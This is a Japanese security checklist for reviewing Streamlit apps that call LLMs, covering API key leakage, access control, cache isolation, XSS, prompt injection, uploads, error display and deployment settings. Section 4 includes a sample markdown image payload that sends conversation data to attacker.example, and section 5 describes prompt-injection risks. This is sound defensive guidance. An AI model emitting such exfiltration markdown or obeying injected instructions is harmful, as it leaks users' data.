カテゴリごとに「何を見るか」「なぜ問題か」「よくある修正」をまとめている。アプリに関係しないカテゴリ（たとえばファイルアップロードがないアプリの「入力処理」）は、「該当なし」としてレポートの「問題がなかった項目」に書く。

## 1. 秘密情報（APIキー）

| 確認すること | なぜ問題か | 修正の方向 |
|---|---|---|
| ソースコードにキーが直接書かれていないか | コードを共有したり git に push したりすると漏れる | 環境変数や `st.secrets` から読み込む |
| `.env` と `.streamlit/secrets.toml` が `.gitignore` に入っているか、`git ls-files` に出てこないか | GitHub などに公開すると、数分でボットに見つかり悪用される | `.gitignore` に追加し、`git rm --cached` で追跡を外す。すでに push 済みならキーを再発行する |
| git の過去のコミットにキーがないか | ファイルを消しても、履歴には残る | キーを再発行する（履歴の書き換えより先に） |
| **サーバー側のキーをウィジェットの `value=` に入れていないか**（例: `st.text_input("APIキー", value=os.getenv(...), type="password")`） | Streamlit はウィジェットの値をブラウザに送る。`type="password"` は画面上の見た目を伏せるだけで、開発者ツールや「表示」ボタンでキーを読み取れる。公開すると誰でもキーを取り出せる | サーバー側のキーがあるときは入力欄を出さず、「設定済み」と表示するだけにする。入力欄は空で始め、ユーザー自身のキーを入れてもらう |
| `st.write(os.environ)`、`st.write(st.secrets)`、`print(api_key)`、デバッグ用の表示が残っていないか | 画面やログにキーが出る | 削除する |
| 例外メッセージやログにキーが含まれる可能性がないか（URL のクエリに `key=` を付けて送る SDK や REST 呼び出し） | エラーを画面に表示すると、キーが見えてしまう | 7章を参照 |
| OneDrive / Dropbox / iCloud などで同期されるフォルダーに `.env` があるか | 同期先のクラウドや、共有リンクから漏れる経路が増える | Info として記載する。リポジトリを同期対象外のフォルダーに移すか、キーを OS の環境変数で管理する |

キーの形式の例: Google/Gemini `AIza...`、OpenAI `sk-...` / `sk-proj-...`、Anthropic `sk-ant-...`、Groq `gsk_...`、Hugging Face `hf_...`、AWS `AKIA...`

## 2. 公開時のアクセス制御とコスト

| 確認すること | なぜ問題か | 修正の方向 |
|---|---|---|
| 認証があるか（`st.login` / `st.user`、リバースプロキシの認証、Streamlit Community Cloud の閲覧者制限など） | 認証がないと、URL を知っている人なら誰でも、あなたのキーで LLM を使える | 認証を入れる。または、ユーザーに自分のキーを入力してもらう方式（BYOK）にする |
| 利用回数の制限があるか（セッションごとの回数、時間あたりの回数） | 自動化された大量のリクエストで、請求額が膨らむ | `st.session_state` で回数を数える（ただしリロードで元に戻る）。公開時は、サーバー側やプロバイダー側の上限と、予算アラートを設定する |
| 入力の長さに上限があるか（`max_chars`） | 非常に長い入力を送られると、トークン代がかさむ | `st.text_area(..., max_chars=N)` を指定し、サーバー側でも長さを確認する |
| 出力トークンの上限（`max_output_tokens` / `max_tokens` / `max_completion_tokens`）を指定しているか | 長い出力が続くと、コストが増える | 用途に合った上限を指定する |
| サーバーが待ち受けるアドレス（`--server.address 0.0.0.0`、`config.toml` の `server.address`） | ローカル利用のつもりでも、同じ LAN の他の端末からアクセスできる | ローカル利用だけなら `localhost` にする |

## 3. ユーザー間の分離（キャッシュ・グローバル状態）

Streamlit は、1つのプロセスで全ユーザーのセッションを処理している。`st.session_state` はセッションごとに分かれているが、次のものは全ユーザーで共有される。

- `@st.cache_data` / `@st.cache_resource` の戻り値（引数が同じなら、他のユーザーにも同じ結果が返る）
- モジュールレベルの変数（リストや dict を書き換えている場合）
- ファイルに保存したもの（固定のファイル名で書き出している場合）

| 確認すること | なぜ問題か |
|---|---|
| ユーザーの入力や生成結果を、キャッシュ関数やグローバル変数に入れていないか | 他のユーザーの入力内容や生成結果が見えてしまう |
| ユーザーが入力したAPIキーでクライアントを作り、`st.cache_resource` に入れていないか（引数にキーを含めないなど） | 他のユーザーが、そのキーを使ってしまう |
| 生成結果を固定のファイル名で保存していないか | 同時に使うと、内容が混ざったり上書きされたりする |

ローカルで自分だけが使う場合は Low、公開時は High を目安にする。

## 4. 出力の表示（XSS・データ持ち出し）

| 確認すること | なぜ問題か | 修正の方向 |
|---|---|---|
| `st.markdown(..., unsafe_allow_html=True)`、`st.html(...)`、`components.html(...)` に LLM の出力やユーザーの入力を渡していないか | HTML や JavaScript が実行され、XSS になる。LLM の出力はプロンプトインジェクションで操作できるので、信頼できない入力として扱う | `unsafe_allow_html` を外す。HTML が必要なら、`bleach` などで無害化する |
| LLM の出力を `st.markdown` で表示していて、**かつ**外部の信頼できない文章（Web ページ、アップロードされたファイル、メールなど）を LLM に読ませているか | Markdown の画像 `![](https://attacker.example/?d=...)` が自動で読み込まれ、会話の内容が外部に送られてしまう（データの持ち出し） | 外部の文章を扱う場合だけ指摘する。画像や外部リンクを取り除いてから表示するか、`st.text` / `st.code` で表示する |
| `st.download_button` のファイル名に、ユーザーの入力をそのまま使っていないか | 通常は影響が小さい（ダウンロードされる側の問題） | Info〜Low として扱う |

ユーザーが自分で入力した文章を LLM に送り、その結果を `st.markdown` で表示するだけのアプリなら、影響を受けるのはユーザー自身だけになる。重大度を上げすぎないこと。

## 5. プロンプトインジェクションと LLM の出力の使い方（OWASP LLM Top 10）

| 確認すること | 重大度の目安 |
|---|---|
| LLM の出力を `eval` / `exec` / `subprocess` / `os.system`、SQL、ファイルパス、`pickle` などに渡していないか | Critical |
| ツール呼び出し（function calling）やエージェントで、ファイルの書き込み・削除、外部への送信、コマンドの実行ができる道具を LLM に渡していないか。確認の手順や許可リストはあるか | High |
| システムプロンプトに秘密情報（キー、内部の URL、他のユーザーの情報）を入れていないか | High（プロンプトは引き出せる前提で考える） |
| 信頼できない外部のデータ（Web、ファイル、RAG で取ってきた文書）を、指示と区別せずにプロンプトへ混ぜていないか | 用途によって Medium〜High |
| ユーザー自身の入力だけで動く、テキスト生成専用のアプリか | 影響が小さいので Info〜Low（「ユーザーが自分の出力を操作できる」だけになる） |
| 安全フィルターを無効にしていないか（例: Gemini の `BLOCK_NONE`） | 公開時は Low〜Medium |

## 6. 入力処理（アップロード・URL・サイズ）

| 確認すること | なぜ問題か |
|---|---|
| `st.file_uploader` で `type=` を指定しているか、サイズの上限（`server.maxUploadSize`、既定は 200MB）は適切か | 大きなファイルでメモリや LLM のコストを消費される |
| アップロードされたファイルを `pickle.load`、`yaml.load`（SafeLoader なし）、`torch.load`、`joblib.load` などで読んでいないか | 任意のコードが実行される（Critical） |
| アップロードされたファイルを保存するとき、元のファイル名をパスに使っていないか | `../` を含む名前で、別の場所に書き込まれる（パストラバーサル） |
| ユーザーが入力した URL を、サーバー側で `requests.get` などで取得していないか | 内部のネットワークやクラウドのメタデータ（`169.254.169.254`）にアクセスされる（SSRF）。公開時は High |
| zip などのアーカイブを展開していないか | zip slip や、展開すると巨大になるファイル（zip bomb） |

## 7. エラー処理とログ

| 確認すること | なぜ問題か | 修正の方向 |
|---|---|---|
| `st.error(f"...{e}")`、`st.exception(e)` で例外をそのまま表示していないか | 内部のパスや設定、場合によってはキーを含む URL が見えてしまう。ローカルなら Info、公開時は Medium | 公開時は、ユーザーには一般的なメッセージだけを出し、詳細はサーバーのログに出す |
| `.streamlit/config.toml` の `client.showErrorDetails`（未設定だと、捕捉されなかった例外のトレースバックが画面に出る） | 内部の情報が見えてしまう | 公開時は `"none"` などに設定する |
| プロンプトや出力をログやファイルに保存していないか。保存先とアクセス権限は適切か | 個人情報や機密が残る | 保存しない、保存期間を決める、伏せ字にする |

## 8. 依存パッケージ

- バージョンを固定せず `>=` だけで指定していると、将来のバージョンで意図しない変更が入るおそれがある（Low）。`pip freeze` や `uv lock` などでバージョンを固定する方法を提案する。
- `pip-audit` が使えるなら、`pip-audit -r requirements.txt` や、venv 内で `pip-audit` を実行する。使えなければ、インストールせずに実行方法だけを案内する。
- 実際にインストールされているバージョンは、`.venv` の `pip list` などで確認する。
- 脆弱性の番号（CVE / GHSA）は、ツールの出力で確認できたものだけを書く。

## 9. デプロイ設定

| 確認すること | なぜ問題か |
|---|---|
| `server.enableXsrfProtection = false`、`server.enableCORS = false` | CSRF 対策が外れる。理由がないなら既定値に戻す |
| Dockerfile で root ユーザーのまま実行していないか、`.env` をイメージに `COPY` していないか | イメージからキーが漏れる。侵害されたときの被害が大きくなる |
| `.dockerignore` に `.env`、`.git`、`secrets.toml` が入っているか | 同上 |
| デバッグ用のフラグや、開発用のエンドポイントが残っていないか | 内部の情報が見えてしまう |
| HTTPS で公開しているか（リバースプロキシや PaaS で TLS を終端しているか） | ユーザーが入力したキーや文章が、平文で流れる |
